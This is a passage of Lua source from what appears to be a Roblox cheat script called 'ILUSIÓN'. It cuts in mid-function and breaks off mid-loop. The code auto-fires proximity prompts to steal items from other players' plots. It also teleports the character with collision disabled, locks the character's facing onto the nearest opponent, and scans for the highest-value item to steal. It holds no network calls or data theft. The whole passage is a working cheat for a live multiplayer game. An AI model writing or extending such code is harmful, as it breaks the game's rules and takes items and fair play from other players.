 for _, fn in ipairs((StealA.data[prompt] and StealA.data[prompt].hold) or {}) do
 task.spawn(fn)
 end
 if fireproximityprompt then pcall(function() fireproximityprompt(prompt, dur) end) end

 if pauseOn then
 -- 0 → pausePct, wait close, then → 100%
 local t0 = tick()
 while tick() - t0 < dur * pausePct do
 if not StealA.enabled or not stillInRange() then
 _G.IlusionStealBar.Reset()
 StealA.busy = false
 return
 end
 local p = (tick() - t0) / dur
 _G.IlusionStealBar.Set(math.clamp(p, 0, pausePct), "STEALING")
 task.wait()
 end
 _G.IlusionStealBar.Set(pausePct, "WAIT")
 -- wait until close
 while StealA.enabled and stillInRange() and not closeEnough() do
 _G.IlusionStealBar.Set(pausePct, "WAIT")
 task.wait(0.05)
 end
 if not StealA.enabled or not stillInRange() then
 _G.IlusionStealBar.Reset()
 StealA.busy = false
 return
 end
 local t1 = tick()
 local remain = dur * (1 - pausePct)
 while tick() - t1 < remain do
 if not StealA.enabled or not stillInRange() then
 _G.IlusionStealBar.Reset()
 StealA.busy = false
 return
 end
 local p = pausePct + (tick() - t1) / remain * (1 - pausePct)
 _G.IlusionStealBar.Set(p, "STEALING")
 task.wait()
 end
 else
 -- continuous 0-100 loop while in radius
 while StealA.enabled and stillInRange() do
 local t0 = tick()
 while tick() - t0 < dur do
 if not StealA.enabled or not stillInRange() then
 _G.IlusionStealBar.Reset()
 StealA.busy = false
 return
 end
 _G.IlusionStealBar.Set((tick() - t0) / dur, "STEALING")
 task.wait()
 end
 _G.IlusionStealBar.Set(1, "SUCCESS")
 fireSteal(prompt)
 _G.IlusionStealBar.Reset() -- 100% → 0 ngay, loop tiếp trong radius
 end
 StealA.busy = false
 return
 end
 _G.IlusionStealBar.Set(1, "SUCCESS")
 fireSteal(prompt)
 _G.IlusionStealBar.Reset() -- 100% → 0 ngay
 StealA.busy = false
 -- tiếp tục nếu còn trong radius (heartbeat startAutoSteal sẽ pick lại)
	end)
end

function executeStealV2(prompt, part)
	-- V2: hold full then trigger when in range (simpler BloodHounds-like)
	if StealA.busy or not prompt then return end
	StealA.busy = true
	local dur = St.stealDuration or 1.4
	task.spawn(function()
 local t0 = tick()
 while tick() - t0 < dur do
 if not StealA.enabled then
 _G.IlusionStealBar.Reset()
 StealA.busy = false
 return
 end
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r or not part or not part.Parent then
 _G.IlusionStealBar.Reset()
 StealA.busy = false
 return
 end
 if (r.Position - part.Position).Magnitude > (St.stealRadius or 60) then
 _G.IlusionStealBar.Reset()
 StealA.busy = false
 return
 end
 _G.IlusionStealBar.Set((tick() - t0) / dur, "STEALING")
 task.wait()
 end
 _G.IlusionStealBar.Set(1, "SUCCESS")
 fireSteal(prompt)
 _G.IlusionStealBar.Reset() -- 100% → 0 ngay
 StealA.busy = false
	end)
end

function startAutoSteal()
	StealA.enabled = true
	if StealA.conn then return end
	StealA.conn = RS.Heartbeat:Connect(function()
 if not StealA.enabled or StealA.busy then return end
 local prompt, part = findStealPrompt()
 if prompt then
 if St.stealVer == "V2" then
 executeStealV2(prompt, part)
 else
 executeStealV1(prompt, part)
 end
 end
	end)
end
function stopAutoSteal()
	StealA.enabled = false
	StealA.busy = false
	if StealA.conn then pcall(function() StealA.conn:Disconnect() end) StealA.conn = nil end
	-- Chỉ về 0%, KHÔNG ẩn / destroy steal bar
	_G.AceStealBarProgress = 0
	pcall(function() if _G.StealBar and _G.StealBar.Reset then _G.StealBar.Reset() end end)
	pcall(function() if _G.IlusionStealBar and _G.IlusionStealBar.Reset then _G.IlusionStealBar.Reset() end end)
end
function setAutoSteal(on)
	-- exported below
	St.autoSteal = on and true or false
	autoStealEnabled = St.autoSteal
	autoStealRadius = tonumber(St.stealRadius) or 60
	selectedStealMode = St.stealVer or "V1"
	if St.autoSteal then startAutoSteal() else stopAutoSteal() end
	if _G.IlusionSyncAutoSteal then pcall(_G.IlusionSyncAutoSteal) end
	if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
	-- đảm bảo nút mobile tồn tại
	if St.autoSteal and (not actRefs or not actRefs.steal) and _G.IlusionApplyMobile then
 pcall(_G.IlusionApplyMobile)
	end
	saveCfg()
end

----------------------------------------------------------------
-- PANEL TP (from ILUSIÓN, no music / no image / no sentry)
----------------------------------------------------------------
local TP = {
	base = nil, pet = nil,
	delayBase = 0.07, delayPet = 0.07,
	key = Enum.KeyCode.X,
	busy = false, markers = {},
}

_G.setAutoSteal = setAutoSteal
_G.setDestroySentry = setDestroySentry

function tpMarker(pos, col)
	local P = Instance.new("Part")
	P.Size = Vector3.new(3, 0.25, 3)
	P.Material = Enum.Material.Neon
	P.Anchored = true
	P.CanCollide = false
	P.Position = pos + Vector3.new(0, 2, 0)
	P.Color = col
	P.Name = "IlusionTP_SavePoint"
	P.Parent = workspace
	return P
end

function smoothTP(hrp, pos)
	hrp.AssemblyLinearVelocity = Vector3.zero
	hrp.AssemblyAngularVelocity = Vector3.zero
	local tw = TS:Create(hrp, TweenInfo.new(0.065, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
 CFrame = CFrame.new(pos),
	})
	tw:Play()
	tw.Completed:Wait()
end

function chilliTP(hrp, targetPos, char)
	if not hrp or not targetPos then return end
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	-- equip carpet if any
	pcall(function()
 for _, n in ipairs({"Flying Carpet", "Carpet", "Cloud", "Witch's Broom"}) do
 local g = char:FindFirstChild(n) or LP.Backpack:FindFirstChild(n)
 if g and hum then hum:EquipTool(g) break end
 end
	end)
	task.wait(0.04)
	for _, p in ipairs(char:GetDescendants()) do
 if p:IsA("BasePart") then pcall(function() p.CanCollide = false end) end
	end
	if hum then pcall(function() hum.PlatformStand = true end) end
	local airHeight = 95
	local airPos = Vector3.new(targetPos.X, targetPos.Y + airHeight, targetPos.Z)
	hrp.CFrame = CFrame.new(airPos)
	hrp.AssemblyLinearVelocity = Vector3.new(0, -5, 0)
	task.wait(0.05)
	hrp.AssemblyLinearVelocity = Vector3.new(0, -220, 0)
	local landY = targetPos.Y + 3
	pcall(function()
 local params = RaycastParams.new()
 params.FilterType = Enum.RaycastFilterType.Exclude
 params.FilterDescendantsInstances = { char }
 local result = workspace:Raycast(airPos, Vector3.new(0, -(airHeight + 80), 0), params)
 if result then landY = result.Position.Y + 3.2 end
	end)
	local landPos = Vector3.new(targetPos.X, landY, targetPos.Z)
	local t0 = os.clock()
	while os.clock() - t0 < 0.55 do
 if not hrp.Parent then break end
 if hrp.Position.Y <= landY + 8 then break end
 hrp.AssemblyLinearVelocity = Vector3.new(0, -220, 0)
 task.wait()
	end
	for _ = 1, 6 do
 if not hrp.Parent then break end
 hrp.CFrame = CFrame.new(landPos)
 hrp.AssemblyLinearVelocity = Vector3.zero
 task.wait(0.03)
	end
	if hum then pcall(function() hum.PlatformStand = false end) end
	for _, p in ipairs(char:GetDescendants()) do
 if p:IsA("BasePart") then pcall(function() p.CanCollide = true end) end
	end
end

function runPanelTP()
	if TP.busy then return end
	if not TP.base and not TP.pet then
 showToast("Chua luu diem")
 return
	end
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	TP.busy = true
	task.spawn(function()
 pcall(function()
 if (TP.base and not TP.pet) or (TP.pet and not TP.base) then
 chilliTP(hrp, TP.base or TP.pet, char)
 else
 smoothTP(hrp, TP.base)
 task.wait(TP.delayBase)
 char = LP.Character or char
 hrp = char and char:FindFirstChild("HumanoidRootPart") or hrp
 if hrp and TP.pet then smoothTP(hrp, TP.pet) end
 end
 end)
 TP.busy = false
 if _G.IlusionRefreshTPBtn then _G.IlusionRefreshTPBtn() end
	end)
end

-- Panel TP GUI (popup)
function openPanelTP()
	local old = PlayerGui:FindFirstChild("IlusionPanelTP")
	if old then old:Destroy() end
	local gui = Instance.new("ScreenGui")
	gui.Name = "IlusionPanelTP"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 130
	gui.Parent = PlayerGui
	local f = Instance.new("Frame")
	f.Size = UDim2.new(0, 260, 0, 320)
	f.Position = UDim2.new(0.5, -130, 0.5, -160)
	f.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
	f.BorderSizePixel = 0
	f.Active = true
	f.Parent = gui
	Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
	local st = Instance.new("UIStroke", f)
	st.Color = Color3.fromRGB(120, 90, 200)
	st.Thickness = 1.5
	-- drag
	local panelLocked = false
	do
 local dragging, dragStart, startPos
 f.InputBegan:Connect(function(input)
 if panelLocked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = f.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 -- save panel pos
 St._panelTPPos = {f.Position.X.Scale, f.Position.X.Offset, f.Position.Y.Scale, f.Position.Y.Offset}
 saveCfg()
 end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if dragging and not panelLocked and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 local d = input.Position - dragStart
 f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
	end
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -120, 0, 32)
	title.Position = UDim2.new(0, 10, 0, 4)
	title.BackgroundTransparency = 1
	title.Text = "PANEL TP"
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 14
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = f
	local close = Instance.new("TextButton")
	close.Size = UDim2.new(0, 28, 0, 28)
	close.Position = UDim2.new(1, -34, 0, 6)
	close.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
	close.Text = "X"
	close.TextColor3 = Color3.new(1, 1, 1)
	close.Font = Enum.Font.GothamBold
	close.Parent = f
	Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
	close.MouseButton1Click:Connect(function() gui:Destroy() end)
	local lockB = Instance.new("TextButton")
	lockB.Size = UDim2.new(0, 64, 0, 24)
	lockB.Position = UDim2.new(1, -100, 0, 8)
	lockB.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
	lockB.Text = "UNLOCK"
	lockB.TextColor3 = Color3.new(1,1,1)
	lockB.Font = Enum.Font.GothamBold
	lockB.TextSize = 10
	lockB.Parent = f
	Instance.new("UICorner", lockB).CornerRadius = UDim.new(0, 6)
	lockB.MouseButton1Click:Connect(function()
 panelLocked = not panelLocked
 lockB.Text = panelLocked and "LOCK" or "UNLOCK"
 lockB.BackgroundColor3 = panelLocked and Color3.fromRGB(180, 60, 80) or Color3.fromRGB(40, 40, 55)
	end)
	-- restore pos
	if St._panelTPPos then
 f.Position = UDim2.new(St._panelTPPos[1], St._panelTPPos[2], St._panelTPPos[3], St._panelTPPos[4])
	end

	local function mkBtn(text, y, col, cb)
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(1, -24, 0, 32)
 b.Position = UDim2.new(0, 12, 0, y)
 b.BackgroundColor3 = Color3.fromRGB(30, 30, 30) or Color3.fromRGB(50, 50, 70)
 b.Text = text
 b.TextColor3 = Color3.new(1, 1, 1)
 b.Font = Enum.Font.GothamBold
 b.TextSize = 12
 b.Parent = f
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 12)
 local edge = Instance.new("UIStroke")
 edge.Color = Color3.fromRGB(45, 45, 45)
 edge.Thickness = 1
 edge.Parent = b
 b.MouseButton1Click:Connect(cb)
 return b
	end
	mkBtn("Luu Base (diem 1)", 44, Color3.fromRGB(180, 80, 140), function()
 local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not hrp then return end
 TP.base = hrp.Position
 if TP.markers.base then TP.markers.base:Destroy() end
 TP.markers.base = tpMarker(TP.base, Color3.fromRGB(255, 105, 180))
 showToast("BASE SAVED")
 if _G.IlusionRefreshTPBtn then _G.IlusionRefreshTPBtn() end
	end)
	mkBtn("Luu Pet (diem 2)", 84, Color3.fromRGB(200, 120, 40), function()
 local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not hrp then return end
 TP.pet = hrp.Position
 if TP.markers.pet then TP.markers.pet:Destroy() end
 TP.markers.pet = tpMarker(TP.pet, Color3.fromRGB(255, 140, 0))
 showToast("PET SAVED")
 if _G.IlusionRefreshTPBtn then _G.IlusionRefreshTPBtn() end
	end)
	mkBtn("Xoa diem", 124, Color3.fromRGB(80, 40, 40), function()
 TP.base, TP.pet = nil, nil
 if TP.markers.base then TP.markers.base:Destroy() end
 if TP.markers.pet then TP.markers.pet:Destroy() end
 TP.markers = {}
 showToast("CLEARED")
 if _G.IlusionRefreshTPBtn then _G.IlusionRefreshTPBtn() end
	end)
	mkBtn("TP NOW", 164, Color3.fromRGB(90, 70, 180), function()
 runPanelTP()
	end)
	-- delays
	local function delayRow(label, key, y)
 local t = Instance.new("TextLabel")
 t.Size = UDim2.new(0.5, 0, 0, 24)
 t.Position = UDim2.new(0, 12, 0, y)
 t.BackgroundTransparency = 1
 t.Text = label
 t.TextColor3 = Color3.fromRGB(120, 120, 120)
 t.TextSize = 11
 t.Font = Enum.Font.Gotham
 t.TextXAlignment = Enum.TextXAlignment.Left
 t.Parent = f
 local val = Instance.new("TextLabel")
 val.Size = UDim2.new(0, 50, 0, 24)
 val.Position = UDim2.new(1, -100, 0, y)
 val.BackgroundTransparency = 1
 val.Text = string.format("%.2f", TP[key])
 val.TextColor3 = Color3.new(1, 1, 1)
 val.Font = Enum.Font.GothamBold
 val.TextSize = 12
 val.Parent = f
 for i, sign in ipairs({ "-", "+" }) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 24, 0, 24)
 b.Position = UDim2.new(1, -40 + (i - 1) * 28 - 28, 0, y)
 b.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
 b.Text = sign
 b.TextColor3 = Color3.new(1, 1, 1)
 b.Font = Enum.Font.GothamBold
 b.Parent = f
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 b.MouseButton1Click:Connect(function()
 TP[key] = math.clamp(TP[key] + (sign == "+" and 0.01 or -0.01), 0.01, 0.5)
 val.Text = string.format("%.2f", TP[key])
 end)
 end
	end
	delayRow("Delay Base", "delayBase", 210)
	delayRow("Delay Pet", "delayPet", 240)
	-- keybind
	local keyBtn = mkBtn("PHIM TP: [" .. tostring(TP.key):gsub("Enum.KeyCode.", "") .. "]", 270, Color3.fromRGB(40, 40, 55), function() end)
	keyBtn.MouseButton1Click:Connect(function()
 keyBtn.Text = "Nhan phim..."
 local conn
 conn = UIS.InputBegan:Connect(function(input, gp)
 if gp or input.UserInputType ~= Enum.UserInputType.Keyboard then return end
 TP.key = input.KeyCode
 keyBtn.Text = "PHIM TP: [" .. input.KeyCode.Name .. "]"
 conn:Disconnect()
 end)
	end)
end

-- Center TP button when 2 points saved
do
	local tpg = Instance.new("ScreenGui")
	tpg.Name = "IlusionCenterTP"
	tpg.ResetOnSpawn = false
	tpg.IgnoreGuiInset = true
	tpg.DisplayOrder = 1002
	tpg.Parent = PlayerGui
	local btn = Instance.new("TextButton")
	btn.Name = "CenterTP"
	btn.Size = UDim2.new(0, 160, 0, 40)
	btn.Position = UDim2.new(0.5, -80, 1, -120)
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
	btn.Text = "TP"
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBlack
	btn.TextSize = 14
	btn.Visible = false
	btn.Parent = tpg
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
	local bst = Instance.new("UIStroke", btn)
	bst.Color = Color3.fromRGB(140, 100, 255)
	btn.MouseButton1Click:Connect(runPanelTP)
	function _G.IlusionRefreshTPBtn()
 local has = TP.base ~= nil or TP.pet ~= nil
 btn.Visible = has
 local kn = tostring(TP.key):gsub("Enum.KeyCode.", "")
 if TP.base and TP.pet then
 btn.Text = "TP [" .. kn .. "]"
 elseif TP.base or TP.pet then
 btn.Text = "TP 1pt [" .. kn .. "]"
 else
 btn.Visible = false
 end
	end
end

UIS.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == TP.key then
 runPanelTP()
	end
end)


----------------------------------------------------------------
-- BODY LOCK (full ILUSIÓN Clean / BloodHounds)
----------------------------------------------------------------
local bodyLockEnabled = false
local bodyLockRange = 20
local _bodyLockConn = nil
local _blSuppressCount = 0

function bodyLockCombatActive()
	return (_G.AceNormalAimbotOn == true)
 or (_G.AceAntiBypassAimbotOn == true)
 or (_G.AceAntiDesyncAimbotOn == true)
 or (St and St.toolAim == true and _G._VisToolAimActive == true)
end

function getClosestTargetBody()
	local char = LP.Character
	if not char then return nil end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return nil end
	local closest, minDist = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
 if plr ~= LP and plr.Character then
 local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
 local hum = plr.Character:FindFirstChildOfClass("Humanoid")
 if tRoot and hum and hum.Health > 0 then
 local dist = (tRoot.Position - root.Position).Magnitude
 if dist < minDist then
 minDist = dist
 closest = tRoot
 end
 end
 end
	end
	return closest
end

-- Clean / BloodHounds body lock tick (predict + angular velocity)
function _bodyLockTick()
	local char = LP.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local target = getClosestTargetBody()
	if not target then
 if not hum.AutoRotate then hum.AutoRotate = true end
 return
	end
	local range = tonumber(bodyLockRange) or (type(St)=="table" and tonumber(St.bodyLockRange)) or 20
	local dist = (target.Position - root.Position).Magnitude
	if dist > range then
 if not hum.AutoRotate then hum.AutoRotate = true end
 return
	end
	if hum.AutoRotate then hum.AutoRotate = false end
	local targetVel = target.AssemblyLinearVelocity
	local speed3 = targetVel.Magnitude
	local predictTime = math.clamp(speed3 / 80, 0.08, 0.35)
	local predictedPos = target.Position + targetVel * predictTime
	local targetHead = target.Parent and target.Parent:FindFirstChild("Head")
	local targetHeight = targetHead and targetHead.Position.Y or target.Position.Y
	local myHeight = root.Position.Y + (hum.HipHeight or 0)
	local heightDiff = targetHeight - myHeight
	local verticalCorrection = math.clamp(heightDiff * 0.15, -1.5, 1.5)
	local flatTarget = Vector3.new(predictedPos.X, root.Position.Y + verticalCorrection, predictedPos.Z)
	local toPredict = flatTarget - root.Position
	if toPredict.Magnitude > 0.1 then
 local goalCF = CFrame.lookAt(root.Position, flatTarget)
 local diffCF = root.CFrame:Inverse() * goalCF
 local _, ry, _ = diffCF:ToEulerAnglesXYZ()
 ry = math.clamp(ry, -2.5, 2.5)
 root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(0, ry * 42, 0))
	end
end

function startBodyLock()
	if _bodyLockConn then
 pcall(function() _bodyLockConn:Disconnect() end)
 _bodyLockConn = nil
	end
	bodyLockEnabled = true
	if type(St) == "table" then St.bodyLock = true end
	local RS_ = RS or RunService or game:GetService("RunService")
	_bodyLockConn = RS_.RenderStepped:Connect(function()
 if not bodyLockEnabled then return end
 if (_blSuppressCount or 0) > 0 then return end
 _bodyLockTick()
	end)
end

function stopBodyLock()
	if _bodyLockConn then
 pcall(function() _bodyLockConn:Disconnect() end)
 _bodyLockConn = nil
	end
	bodyLockEnabled = false
	if type(St) == "table" then St.bodyLock = false end
	local c = LP.Character
	local root = c and c:FindFirstChild("HumanoidRootPart")
	if root then
 root.AssemblyAngularVelocity = Vector3.zero
 root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, -0.1, root.AssemblyLinearVelocity.Z)
	end
	local hum2 = c and c:FindFirstChildOfClass("Humanoid")
	if hum2 then hum2.AutoRotate = true end
end

-- Clean suppress (auto left/right / bat can pause lock)
function _suppressBodyLock()
	_blSuppressCount = (_blSuppressCount or 0) + 1
	if _blSuppressCount == 1 and bodyLockEnabled then
 _blWasEnabled = true
 -- only disconnect loop, keep bodyLockEnabled true for restore
 if _bodyLockConn then
 pcall(function() _bodyLockConn:Disconnect() end)
 _bodyLockConn = nil
 end
 if bodyLockSetVisual then pcall(bodyLockSetVisual, false) end
 if _blRestoreTimer then
 pcall(task.cancel, _blRestoreTimer)
 _blRestoreTimer = nil
 end
 _blSmoothRestore = false
	end
end

function _unsuppressBodyLock(delayed)
	if (_blSuppressCount or 0) > 0 then
 _blSuppressCount = _blSuppressCount - 1
	end
	if _blSuppressCount == 0 and _blWasEnabled then
 _blWasEnabled = false
 local function restore()
 if bodyLockEnabled then
 _blSmoothRestore = true
 startBodyLock()
 if bodyLockSetVisual then pcall(bodyLockSetVisual, true) end
 task.delay(0.5, function() _blSmoothRestore = false end)
 end
 _blRestoreTimer = nil
 end
 if delayed then
 _blRestoreTimer = task.delay(1, restore)
 else
 restore()
 end
	end
end

function setBodyLock(on)
	if on then startBodyLock() else stopBodyLock() end
	pcall(function() if saveCfg then saveCfg() end end)
end

-- sync range from config when set
function setBodyLockRange(v)
	v = math.clamp(tonumber(v) or 20, 5, 100)
	bodyLockRange = v
	St.bodyLockRange = v
	saveCfg()
end


----------------------------------------------------------------
-- UI: Panel tab + Auto Steal + InfJump mode on existing pages
----------------------------------------------------------------
task.defer(function()
	-- Auto steal on Player page
	if not pagePlayer then warn("[ILUSIÓN] pagePlayer nil") return end
	section(pagePlayer, "* — AUTO STEAL", 20)
	local function safeSetAS(on)
 if type(setAutoSteal) == "function" then
 setAutoSteal(on)
 else
 St.autoSteal = on and true or false
 end
	end
	toggleNamed(pagePlayer, "Auto Steal", St.autoSteal == true, safeSetAS, 21, "autoSteal")
	-- ver modes
	local verRow = row(pagePlayer, 36, 22)
	local vl = Instance.new("TextLabel")
	vl.Size = UDim2.new(0.35, 0, 1, 0)
	vl.Position = UDim2.new(0, 10, 0, 0)
	vl.BackgroundTransparency = 1
	vl.Text = "Version"
	vl.TextColor3 = C.text
	vl.TextSize = 12
	vl.Font = Enum.Font.Gotham
	vl.TextXAlignment = Enum.TextXAlignment.Left
	vl.Parent = verRow
	for i, name in ipairs({"V1", "V2", "V3"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 40, 0, 26)
 b.Position = UDim2.new(1, -140 + (i - 1) * 44, 0.5, -13)
 b.BackgroundColor3 = (St.stealVer == name) and C.accent or C.box
 b.Text = name
 b.TextColor3 = (St.stealVer == name) and Color3.fromRGB(30, 20, 30) or C.text
 b.TextSize = 11
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Active = true
 b.ZIndex = 40
 b.Parent = verRow
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
 local function pickVer()
 St.stealVer = name
 for _, ch in ipairs(verRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == St.stealVer
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 -- apply mode immediately (fix non-responsive V1/V2/V3)
 selectedStealMode = (name == "V1") and "Normal" or "Semi"
 if name == "V2" then autoStealV2Version = "V1" end
 if name == "V3" then autoStealV2Version = "V2" end
 if name == "V1" then selectedStealMode = "Normal" end
 autoStealRadius = tonumber(St.stealRadius) or 60
 if type(setAutoSteal) == "function" and St.autoSteal then
 pcall(function() setAutoSteal(true) end)
 elseif _G.IlusionSyncAutoSteal then
 pcall(_G.IlusionSyncAutoSteal)
 end
 pcall(saveCfg)
 end
 b.MouseButton1Click:Connect(pickVer)
 b.Activated:Connect(pickVer)
	end
	toggleNamed(pagePlayer, "Pause (chi khi ON)", St.stealPause == true, function(on)
 St.stealPause = on and true or false
 _G.IlusionStealPause = St.stealPause
 if _G.IlusionSyncAutoSteal then pcall(_G.IlusionSyncAutoSteal) end
 saveCfg()
	end, 23, "stealPause")
	-- radius box
	local rr = row(pagePlayer, 36, 24)
	local rl = Instance.new("TextLabel")
	rl.Size = UDim2.new(0.5, 0, 1, 0)
	rl.Position = UDim2.new(0, 10, 0, 0)
	rl.BackgroundTransparency = 1
	rl.Text = "Steal Radius"
	rl.TextColor3 = C.text
	rl.TextSize = 12
	rl.Font = Enum.Font.Gotham
	rl.TextXAlignment = Enum.TextXAlignment.Left
	rl.Parent = rr
	numBox(rr, UDim2.new(1, -70, 0.5, -12), 56, St.stealRadius, function(v)
 St.stealRadius = v
 saveCfg()
	end)
	-- force scroll size so AUTO STEAL is visible
	pcall(function()
 local lay = pagePlayer:FindFirstChildOfClass("UIListLayout")
 if lay then
 pagePlayer.CanvasSize = UDim2.new(0, 0, 0, lay.AbsoluteContentSize.Y + 40)
 end
	end)

	-- InfJump mode row near inf jump if exists
	section(pagePlayer, "* — INF JUMP MODE", 217)
	local ij = row(pagePlayer, 36, 218)
	for i, name in ipairs({"hold", "manual"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 70, 0, 26)
 b.Position = UDim2.new(0, 12 + (i - 1) * 80, 0.5, -13)
 b.BackgroundColor3 = (St.infJumpMode == name) and C.accent or C.box
 b.Text = name
 b.TextColor3 = (St.infJumpMode == name) and Color3.fromRGB(30, 20, 30) or C.text
 b.TextSize = 11
 b.Font = Enum.Font.GothamBold
 b.Parent = ij
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
 b.MouseButton1Click:Connect(function()
 setInfJumpMode(name)
 for _, ch in ipairs(ij:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == St.infJumpMode
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 end)
	end

	setTab("Panel")
end)

print("[ILUSIÓN Ext] Panel TP | AutoSteal V1/V2 + bar | InfJump hold/manual | ToolAim ON")



-- ============================================================
-- TP TO BEST (Chilli style) — equip carpet + TP best brainrot
-- ============================================================
function parseGenValue(text)
	if not text then return 0 end
	text = tostring(text):gsub(",", ""):gsub("%s", ""):upper()
	-- $5M/s $1.2B 850M 7M/S 14.8B
	local best = 0
	for num, suffix in text:gmatch("([%d%.]+)([KMBTQA]?)") do
 local n = tonumber(num)
 if n then
 local mul = 1
 if suffix == "K" then mul = 1e3
 elseif suffix == "M" then mul = 1e6
 elseif suffix == "B" then mul = 1e9
 elseif suffix == "T" then mul = 1e12
 elseif suffix == "Q" or suffix == "QA" then mul = 1e15
 end
 local v = n * mul
 if v > best then best = v end
 end
	end
	return best
end

function isStealAction(prompt)
	if not prompt or not prompt:IsA("ProximityPrompt") then return false end
	local act = tostring(prompt.ActionText or ""):lower()
	local obj = tostring(prompt.ObjectText or ""):lower()
	-- EN + ES + VI (Steal)
	if act:find("steal") or act:find("robar") or act:find("steal") or act:find("steal")
 or act:find("grab") or act:find("take") then
 return true
	end
	if obj:find("steal") or obj:find("steal") or obj:find("steal") or obj:find("robar") then
 return true
	end
	-- unicode normalize fallback
	local actRaw = tostring(prompt.ActionText or "")
	if actRaw:find("uop") or actRaw:find("Steal") or actRaw:find("steal") then return true end
	return false
end

function isOwnPlot(plot)
	if not plot then return false end
	local sign = plot:FindFirstChild("PlotSign") or plot:FindFirstChild("Sign")
	if sign then
 for _, d in ipairs(sign:GetDescendants()) do
 if d:IsA("BillboardGui") and (d.Name:lower():find("your") or d.Enabled) then
 if d.Name:lower():find("your") or d.Name:lower():find("base") then
 -- check owner attribute
 end
 end
 end
	end
	-- attribute / string value owner
	local ok, owner = pcall(function()
 return plot:GetAttribute("Owner") or plot:GetAttribute("OwnerId")
	end)
	if ok and owner and tostring(owner) == tostring(LP.UserId) then return true end
	local ok2, ownerName = pcall(function()
 return plot:GetAttribute("OwnerName")
	end)
	if ok2 and ownerName and tostring(ownerName) == LP.Name then return true end
	-- YourBase billboard
	for _, d in ipairs(plot:GetDescendants()) do
 if d:IsA("BillboardGui") and d.Name == "YourBase" and d.Enabled then
 return true
 end
	end
	return false
end

function findBestBrainrot()
	local roots = {}
	for _, name in ipairs({"Plots", "plots", "Bases", "Animals", "Pets", "Map"}) do
 local f = workspace:FindFirstChild(name)
 if f then table.insert(roots, f) end
	end
	if #roots == 0 then table.insert(roots, workspace) end

	local bestPrompt, bestVal, bestPart = nil, -1, nil
	local function consider(d)
 if not d:IsA("ProximityPrompt") then return end
 if not isStealAction(d) then return end
 if d.Enabled == false then return end
 -- skip own character
 if LP.Character and d:IsDescendantOf(LP.Character) then return end
 local part = d.Parent
 if not part then return end
 -- climb out of own plot
 local plot = d
 for _ = 1, 8 do
 if not plot.Parent or plot.Parent == workspace then break end
 plot = plot.Parent
 if isOwnPlot(plot) then return end
 end
 local basePart = part:IsA("BasePart") and part
 or (part:IsA("Model") and part:FindFirstChildWhichIsA("BasePart", true))
 or part:FindFirstAncestorWhichIsA("BasePart")
 if not basePart then return end
 local val = 0
 local searchRoot = part:IsA("Model") and part or part.Parent
 if searchRoot then
 for _, lab in ipairs(searchRoot:GetDescendants()) do
 if lab:IsA("TextLabel") or lab:IsA("TextButton") then
 local t = lab.Text or ""
 if t:find("%$") or t:find("/s") or t:find("/S") or t:upper():find("[KMBT]") then
 local v = parseGenValue(t)
 if v > val then val = v end
 end
 end
 end
 end
 local v2 = parseGenValue(d.ObjectText)
 if v2 > val then val = v2 end
 -- BillboardGui near prompt
 for _, bb in ipairs(workspace:GetDescendants()) do
 if bb:IsA("BillboardGui") and bb.Adornee then
 local okd, dist = pcall(function()
 return (bb.Adornee.Position - basePart.Position).Magnitude
 end)
 if okd and dist and dist < 12 then
